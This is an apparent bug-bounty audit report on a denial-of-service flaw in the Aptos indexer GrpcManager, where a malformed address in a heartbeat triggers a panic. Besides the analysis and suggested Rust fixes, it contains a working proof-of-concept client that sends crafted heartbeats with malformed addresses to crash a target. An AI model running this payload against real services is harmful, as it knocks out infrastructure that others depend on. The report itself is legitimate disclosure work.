# Audit Report

## Title
Denial of Service via Malformed Address in ServiceInfo Heartbeat Messages

## Summary
The GrpcManager service accepts heartbeat messages containing ServiceInfo structures with unvalidated address fields. When processing heartbeats from new services, the code attempts to create gRPC clients using `Channel::from_shared(address).expect("Bad address.")`, which panics on malformed URIs. An attacker can crash the GrpcManager process by sending a heartbeat with an invalid address format.

## Finding Description

The vulnerability exists in the indexer-grpc infrastructure where the GrpcManager accepts heartbeat messages from data services, fullnodes, and other grpc managers. The ServiceInfo struct contains an optional address field that is never validated: [1](#0-0) 

When the GrpcManager receives a heartbeat, it processes the ServiceInfo and routes it to the appropriate handler based on the info type: [2](#0-1) 

The handler then attempts to register the new service by creating a gRPC client. For example, in `handle_live_data_service_info`: [3](#0-2) 

When inserting a new service entry, the code calls `LiveDataService::new(address)`, which creates a gRPC channel: [4](#0-3) 

The critical issue is on line 90-91: `Channel::from_shared(address).expect("Bad address.")`. The `from_shared()` method expects a valid URI and returns a `Result`. If the address is malformed (e.g., "invalid-uri", ":::", "bad@format"), it returns an error, causing `.expect()` to panic and crash the entire process.

The same vulnerability exists in all service registration paths:
- LiveDataService::new() at lines 89-102
- HistoricalDataService::new() at lines 111-124  
- Fullnode::new() at lines 67-80
- Peer::new() at lines 45-58

**Attack Path:**
1. Attacker sends a gRPC HeartbeatRequest to the GrpcManager endpoint
2. HeartbeatRequest contains a ServiceInfo with a malformed address (e.g., "not::a::valid::uri")
3. GrpcManager calls `handle_heartbeat()` which routes to the appropriate handler
4. Handler calls `.or_insert(Service::new(malformed_address))`
5. `Channel::from_shared(malformed_address)` returns an error
6. `.expect("Bad address.")` panics, crashing the GrpcManager process

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria: "API crashes" and "Validator node slowdowns".

**Direct Impact:**
- Complete crash of the GrpcManager process
- Loss of indexer service availability  
- Disruption to applications relying on the indexer infrastructure
- No automatic recovery - requires manual restart

**Scope:**
- Affects all GrpcManager instances exposed to the network
- Can be triggered remotely by any network peer
- No authentication or authorization checks protect this endpoint
- Single malformed message causes complete service failure

While this does not directly impact consensus or validator operations, the indexer infrastructure is critical for ecosystem functionality. The GrpcManager coordinates between data services, fullnodes, and clients, making it a critical availability component.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially easy to execute:
- No authentication required - any peer can send heartbeat messages
- No rate limiting observed in the code
- Attack payload is simple: just send a malformed string in the address field
- Attacker needs only network access to the GrpcManager endpoint
- Single malicious message causes immediate crash

**Attacker Requirements:**
- Network connectivity to GrpcManager (typically exposed for legitimate services)
- Ability to craft and send gRPC messages (standard gRPC client libraries)
- No special privileges or insider access needed

**Exploitation Complexity:** Trivial - can be done with a few lines of code using any gRPC client library.

## Recommendation

Replace all `.expect("Bad address.")` calls with proper error handling. The address should be validated before attempting to create a channel, and errors should be returned rather than causing panics.

**Fix for LiveDataService::new():**

```rust
fn new(address: GrpcAddress) -> Result<Self> {
    let channel = Channel::from_shared(address.clone())
        .map_err(|e| anyhow::anyhow!("Invalid address '{}': {}", address, e))?
        .connect_lazy();
    let client = DataServiceClient::new(channel)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
    Ok(Self {
        client,
        recent_states: VecDeque::new(),
    })
}
```

Apply similar changes to:
- `HistoricalDataService::new()` at lines 111-124
- `Fullnode::new()` at lines 67-80
- `Peer::new()` at lines 45-58
- Connection creation in `connection_manager.rs` at lines 303-313

Update callers to handle the Result:

```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    let mut entry = self
        .live_data_services
        .entry(address.clone())
        .or_try_insert_with(|| LiveDataService::new(address))?;
    // ... rest of function
}
```

Additionally, consider adding explicit address format validation before attempting client creation:

```rust
fn validate_grpc_address(address: &str) -> Result<()> {
    // Check basic URI format
    if !address.starts_with("http://") && !address.starts_with("https://") {
        return Err(anyhow::anyhow!("Address must start with http:// or https://"));
    }
    // Additional validation as needed
    Ok(())
}
```

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// Compile and run against a running GrpcManager instance

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target GrpcManager
    let channel = Channel::from_static("http://target-grpc-manager:50051")
        .connect()
        .await?;
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Create malformed address - various formats that will cause panic
    let malformed_addresses = vec![
        "not-a-valid-uri",
        ":::invalid:::",
        "bad@format#test",
        "malformed[address]",
        "//missing-scheme",
    ];
    
    for malformed_addr in malformed_addresses {
        println!("Attempting to crash GrpcManager with address: {}", malformed_addr);
        
        // Craft malicious heartbeat
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(malformed_addr.to_string()),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: None,
                    known_latest_version: Some(0),
                    stream_info: None,
                    min_servable_version: None,
                })),
            }),
        };
        
        // Send heartbeat - this will cause GrpcManager to panic and crash
        match client.heartbeat(request).await {
            Ok(_) => println!("Heartbeat succeeded (unexpected)"),
            Err(e) => println!("Error: {} (GrpcManager likely crashed)", e),
        }
        
        // Wait a bit before next attempt
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }
    
    Ok(())
}
```

**Expected Result:** The GrpcManager process will panic and terminate when processing the malformed address, logging something like:
```
thread 'tokio-runtime-worker' panicked at 'Bad address.: InvalidUri(InvalidFormat)', 
ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs:90:14
```

**Notes**
- This vulnerability is exploitable on any exposed GrpcManager instance without authentication
- The panic occurs during `.expect()` unwrapping when `Channel::from_shared()` fails to parse the malformed URI
- All four service types (LiveDataService, HistoricalDataService, Fullnode, Peer) are vulnerable through the same pattern
- The fix requires changing the API from panicking constructors to returning `Result` types with proper error propagation

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L244-250)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ServiceInfo {
    #[prost(string, optional, tag="1")]
    pub address: ::core::option::Option<::prost::alloc::string::String>,
    #[prost(oneof="service_info::Info", tags="2, 3, 4, 5")]
    pub info: ::core::option::Option<service_info::Info>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L89-102)
```rust
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
